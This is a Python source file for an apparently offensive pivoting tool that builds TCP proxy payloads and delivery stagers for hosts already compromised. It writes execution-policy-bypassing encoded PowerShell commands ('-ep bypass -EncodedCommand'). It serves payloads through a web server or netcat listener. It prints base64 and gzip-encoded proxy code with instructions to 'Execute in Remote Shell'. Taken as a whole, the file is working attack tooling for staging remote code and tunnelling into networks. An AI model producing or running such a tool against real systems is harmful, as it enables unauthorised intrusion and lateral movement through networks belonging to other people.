#! /usr/bin/env python3

import os
import gzip
import base64
import options
import argparse

############################
### FUNCTION DEFINITIONS ###
############################
def display_banner() -> None:
    '''Display program banner'''
    banner=''' ▄▖        ▖▖         
 ▙▌▛▘▛▌▚▘▌▌▌▌█▌▛▌▛▌▛▛▌
 ▌ ▌ ▙▌▞▖▙▌▚▘▙▖▌▌▙▌▌▌▌
         ▄▌           \n'''
    print(banner)

def generate_proxy_payload(args: argparse.Namespace, proxy_path: str="") -> str:
    '''Return a proxy with updated placeholders'''
    # Read the appropriate proxy
    if not proxy_path:
        proxy_path = os.path.join(
            os.path.dirname(__file__),
            "proxies",
            args.type,
            f"{args.type}.{args.lang}"
        )
    code = read_file(proxy_path)
    # Replace placeholders with option values
    placeholders = [
        ["{{LHOST}}", args.lhost],
        ["{{LPORT}}", args.lport],
        ["{{RHOST}}", args.rhost],
        ["{{RPORT}}", args.rport],
        ["{{CHOST}}", args.chost],
        ["{{CPORT}}", args.cport]
    ]
    for plc, val in placeholders:
        if val:
            if plc in code:
                code = code.replace(plc, val)
    return code

def generate_stager_payload(args: argparse.Namespace, size: str="") -> str:
    '''Return a stager payload with updated placeholders'''
    stager_path = os.path.join(
        os.path.dirname(__file__),
        "stagers",
        args.delivery,
        f"{args.stager}.{args.lang}"
    )
    stager_code = read_file(stager_path)
    # Get URI if applicable
    if "outfile" in args:
        uri = os.path.basename(args.outfile)
    else:
        uri = ""
    # Update placeholders
    placeholders = [
        ["{{SERVER_IP}}", args.server_ip],
        ["{{SERVER_PORT}}", args.server_port],
        ["{{URI}}", uri],
        ["{{PAYLOAD_SIZE}}", size]
    ]
    for plc, val in placeholders:
        if val:
            stager_code = stager_code.replace(plc, val)
    if args.lang == "ps1":
        stager_code = powershell_encode(stager_code)
    return stager_code

def powershell_encode(code: str) -> str:
    '''Encode the stager for powershell execution'''
    enc = code.encode("utf-16-le")
    if enc.startswith(b"\xff\xfe"):
        enc = enc[2:]
    encoded = base64.b64encode(enc).decode("utf-8")
    cmd = f"powershell.exe -ep bypass -EncodedCommand {encoded}"
    return cmd

def write_file(path: str, content: str) -> None:
    '''Write a text file'''
    f = open(path, "w")
    f.write(content)
    f.close()

def read_file(path: str) -> str:
    '''Read a text file'''
    f = open(path, "r")
    content = f.read()
    f.close()
    return content

def print_msg(msg: str, header: str="") -> None:
    '''Print message as a header'''
    if header:
        hdr = "| " + header.upper() + " |"
        border = len(hdr) * "-"
        hdr = "\n".join([border, hdr, border])
        print(hdr)
    print(msg, "\n")


#############
### MAIN ####
#############
if __name__ == "__main__":
    display_banner()

    # Parse options
    opts = options.Options()
    args = opts.args
    
    # Initialize some arguments that may not always appear
    if "chost" not in args:
        args.chost = None
    if "cport" not in args:
        args.cport = None
    if "server_ip" not in args:
        args.server_ip = None
    if "server_port" not in args:
        args.server_port = None

    # Get proxy code
    proxy_code = generate_proxy_payload(args)

    # Ensure full path
    if "outfile" in args:
        outfile_path = os.path.abspath(args.outfile)

    # Client
    if args.type == "reverse":
        client_path = os.path.join(
            os.path.dirname(__file__),
            "clients",
            "client.py"
        )
        client_code = generate_proxy_payload(args, client_path)
        if "outfile" in args:
            dirname = os.path.dirname(args.outfile)
        else:
            dirname = os.getcwd()
        client_path = os.path.abspath(
            os.path.join(
                dirname,
                "client.py"
            )
        )
        write_file(client_path, client_code)
        print_msg(
            f"python3 {client_path}",
            "Execute Client Listener First"
        )

    # File Delivery
    if args.delivery == "file":
        if args.lang == "php":
            # These tags inhibit stagers, so only add them if its a file
            proxy_code = "<?php\n\n" + proxy_code + "\n\n?>"
        write_file(outfile_path, proxy_code)
        print_msg(
            f"{args.type} tcp proxy written to {outfile_path}",
            "Proxy File"
        )

    # HTTP Delivery
    elif args.delivery == "http":
        http_stager = generate_stager_payload(args)
        write_file(outfile_path, proxy_code)
        print_msg(
            f"{args.type} tcp proxy written to {outfile_path}",
            "Proxy File"
        )
        print_msg(
            f"python3 -m http.server {args.server_port}",
            "Serve Proxy Via Web Server"
        )
        print_msg(
            f"{http_stager}",
            "Execute in Remote Shell"
        )

    # TCP Delivery
    elif args.delivery == "tcp":
        tcp_stager = generate_stager_payload(args, str(len(proxy_code)))
        write_file(outfile_path, proxy_code)
        print_msg(
            f"{args.type} tcp proxy written to {outfile_path}",
            "Proxy File"
        )
        print_msg(
            f"nc -lvnp {args.server_port} <{outfile_path}",
            "Serve Proxy Via Netcat"
        )
        print_msg(
            f"{tcp_stager}",
            "Execute in Remote Shell"
        )

    # Prompt Delivery
    elif args.delivery == "prompt":
        b64proxy = base64.b64encode(
            gzip.compress(
                bytes(proxy_code, "utf-8")
            )
        ).decode("utf-8")
        prompt_stager = generate_stager_payload(args)
        print_msg(
            prompt_stager,
            "Execute in Remote Shell"
        )
        print_msg(
            b64proxy,
            "Paste In Command Prompt"
        )

    # Print a trailing newline
    print()
